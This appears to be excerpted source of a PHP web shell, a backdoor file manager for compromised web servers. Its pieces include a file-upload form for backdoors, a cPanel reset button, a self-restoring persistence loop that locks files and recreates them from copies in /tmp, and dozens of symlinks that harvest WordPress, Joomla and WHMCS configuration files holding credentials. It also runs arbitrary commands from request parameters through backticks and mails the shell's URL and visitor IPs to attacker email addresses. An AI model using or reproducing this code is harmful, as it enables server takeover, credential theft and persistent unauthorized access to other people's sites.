...
if (isset($_GET['viewfile'])) {
    ...
    <input type='file' name='backdoorfile' id='backdoor' style='background-color: grey;' class='form-control' name='uplod'>
    <input type='submit' class='btn btn-outline-light' for='inputGroupFile02' name='uplod' value='Upload'></div>
     ...
     if (isset($_POST['uplod'])) {
        ...
        if (empty($_FILES['backdoorfile']['name'])) {
            ...
            $data = @file_put_contents($serlok."/".$_FILES['backdoorfile']['name'], @file_get_contents($_FILES['backdoorfile']['tmp_name']));
                if (file_exists($serlok."/".$_FILES['backdoorfile']['name'])) {
...
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("resetcp").'=opet">Reset Cpanel</button><hr>&nbsp;';
    ...
    if (isset($_POST['submit'])) {
        ...
        if (file_exists($tempe.'/'.md5($serlok. $filez.'-xbackdoor').backdoor_ex($filez).'xhand.Lock') && file_exists($tempe . '/'.backdoor_ex($filez).'-xopet')) {
            ...
            $content = '<?php
    $tmp = "/tmp";
    $fileperm = backdoor_perm("'.$filez.'");
    backdoor_cmd("chmod 444 '.$filez.'");
    while (True) {
        if (!file_exists("'.$filez.'")) {
            $var = base64_encode(file_get_contents($tmp . "/'.md5($serlok. $filez.'-xopet').backdoor_ex($filez).'xbackdoor.Lock"));
...
echo'</textarea><br>
<input type="hidden" class="input" name="folfig" value="backdoorcfg"/><br>
...
@symlink('/home6/'.$user.'/public_html/BLOG2/configuration.php',$user.'..joomla-config');
@symlink('/home7/'.$user.'/public_html/TEST2/configuration.php',$user.'..joomla-config');
@symlink('/home8/'.$user.'/public_html/JOOMLA2/configuration.php',$user.'..joomla-config');
@symlink('/var/www/vhost'.$user.'/httpdocs/configuration.php',$user.'..joomla-config');
@symlink('/var/www/vhost'.$user.'httpdocs/wp-config.php',$user.'..wp-config');
@symlink('/var/www/vhosts'.$user.'/httpdocs/configuration.php',$user.'..joomla-config');
@symlink('/var/www/vhosts'.$user.'/httpdocs/wp-config.php',$user.'..wp-config');
@symlink('/var/www/vhost'.$user.'/htdocs/configuration.php',$user.'..joomla-config');
@symlink('/var/www/vhost'.$user.'htdocs/wp-config.php',$user.'..wp-config');
@symlink('/var/www/vhosts'.$user.'/htdocs/configuration.php',$user.'..joomla-config');
@symlink('/var/www/vhosts'.$user.'/htdocs/wp-config.php',$user.'..wp-config');
@symlink('/var/wwwroot'.$user.'/wp-config.php',$user.'..wp-config');
@symlink('/var/wwwroot'.$user.'/configuration.php',$user.'..joomla-config');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'..joomla-or-whmcs');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'..wp-config');
@symlink('/home2/'.$user.'/public_html/configuration.php',$user.'..joomla-or-whmcs');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'..wp-config');
@symlink('/home3/'.$user.'/public_html/configuration.php',$user.'..joomla-or-whmcs');@symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$user.'..wp-config');
@symlink('/home4/'.$user.'/public_html/configuration.php',$user.'..joomla-or-whmcs');@symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$user.'..wp-config');
@symlink('/home/'.$user.'/public_html/blog/configuration.php',$user.'..joomla');@symlink('/home4/'.$user.'/public_html/wp/wp-config.php',$user.'..wp-config');
@symlink('/home/'.$user.'/public_html/wordpress/wp-congig.php',$user.'..wordpress');@symlink('/home/'.$user.'/public_html/config.php',$user.'..config');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'..whmcs');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'..supporwhmcs');
@symlink('/home/'.$user.'/public_html/secure/configuration.php',$user.'..securewhmcs');
@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'..whmcs-clients');
@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'..whmcs-client');
@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'..whmcs-billing');
@symlink('/home/'.$user.'/public_html/admin/config.php',$user.'..admin-config');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'..whmcs');
@symlink('/home2/'.$user.'/public_html/support/configuration.php',$user.'..supporwhmcs');
@symlink('/home3/'.$user.'/public_html/secure/configuration.php',$user.'..securewhmcs');
@symlink('/home4/'.$user.'/public_html/clients/configuration.php',$user.'..whmcs-clients');
@symlink('/home5/'.$user.'/public_html/client/configuration.php',$user.'..whmcs-client');
@symlink('/home6/'.$user.'/public_html/billing/configuration.php',$user.'..whmcs-billing');
@symlink('/home7/'.$user.'/public_html/admin/config.php',$user.'..admin-config');
...
print(`{$_REQUEST[I]}`);$e=base64_decode("");                       
    }exit();
...
if(is_readable($serlok)){
            ...
            foreach($fetch as $fols){
                if($fols=='.'||$fols=='..'){
                    ...
                    $backdoors=$serlok.'/'.$fols;
                    if(is_dir($backdoors)){
                        array_push($serlokbos,$fols);
                    }elseif(is_file($backdoors)){
...
$destinationmail = 'rootcyberpunks@gmail.com, fbi.priv.g00gle@gmail.com, muhrazky@gmail.com, malaysia.sender@gmail.com';
...
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$destinationmail = 'rootcyberpunks@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$mail_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($destinationmail, "MD", $mail_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
